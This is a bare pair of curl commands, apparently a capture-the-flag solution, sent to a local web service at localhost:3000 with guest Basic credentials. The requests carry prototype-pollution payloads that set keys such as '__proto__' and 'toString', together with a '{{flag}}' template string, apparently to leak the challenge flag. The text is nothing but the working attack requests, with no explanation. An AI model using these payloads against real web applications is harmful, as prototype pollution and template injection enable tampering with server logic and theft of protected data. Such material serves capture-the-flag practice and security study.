curl -XGET 'http://localhost:3000/show' -H 'Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=' -H "Content-Type: application/json" -d '{"debug": true, "inspect": ["__proto__"]}'


curl 'http://localhost:3000/edit' -H 'Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=' -H "Content-Type: application/json" -d '{"index":"toString","memo":["{{flag}}"], "ip":"__proto__"}'
